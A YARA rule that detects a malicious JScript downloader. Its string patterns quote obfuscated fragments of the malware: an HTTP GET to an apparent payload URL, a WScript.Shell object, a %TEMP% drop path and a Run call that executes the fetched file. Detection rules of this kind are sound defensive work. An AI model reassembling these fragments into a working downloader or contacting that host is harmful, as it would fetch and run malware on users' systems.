rule sig_20160427_b4bf9587bee6836c5137ab859d770e35 {
  meta:
    description = "datamaliciousorder - file 20160427_b4bf9587bee6836c5137ab859d770e35.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cc9cbea16b867f6f795a5441a32a49a98755028fa4b963c032267db07f2d0d3c"

  strings:
    $s1  = "FutldFypyt[RjtqcIfoni](\"G\" + \"ET\", \"http://pediatriayvacunas.com/q0wps\", false);" fullword ascii
    $s2  = "function DdrgjWibdy() {return KrjjvSqomq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"k1QLcWm" ascii
    $s3  = "function DdrgjWibdy() {return KrjjvSqomq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"k1QLcWm" ascii
    $s4  = "function XvrjeWbdbk(MckjrXptfm, HzjdsVqylc){ElozeWiuos = ElozeWiuos * 1; return MckjrXptfm - HzjdsVqylc;};" fullword ascii
    $s5  = "var KrjjvSqomq = function RxvkeLowjm() {return FporgZgacv[FxjpdOqkui](\"WScript\"+\".Shell\");}(), DhnrlSfgux = 11;" fullword ascii
    $s6  = "var FporgZgacv = this[\"WScript\"];" fullword ascii
    $s7  = "function ZkyfgOapnl(){return KbbgzKvfmv + \"\";};" fullword ascii
    $s8  = "if (FutldFypyt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function UvxejNtfzh() {return ((DfbjpIbaxs == true) && (DfbjpIbaxs == IafhlCoyyc)) ? 1 : ElozeWiuos;};" fullword ascii
    $s10 = "function ZgxhjRicra(){return 23;};" fullword ascii
    $s11 = "function MgskeBcynf(GjtmcHyzzt){KrjjvSqomq[\"R\"+\"un\"](GjtmcHyzzt, ElozeWiuos, ElozeWiuos);};" fullword ascii
    $s12 = "function ZcsthAqksh()" fullword ascii
    $s13 = "IafhlCoyyc = true; " fullword ascii
    $s14 = "return XvrjeWbdbk(WcokfMfllq, KkudsClpsv);" fullword ascii
    $s15 = "function UjtjeAhyhh(){return FxjpdOqkui;};" fullword ascii
    $s16 = "var DfbjpIbaxs = false;" fullword ascii
    $s17 = "}while (LsnjmMunii);" fullword ascii
    $s18 = "var UkzzeLwkph = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "ZyfpbNatzb = true;" fullword ascii
    $s20 = "DfbjpIbaxs = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}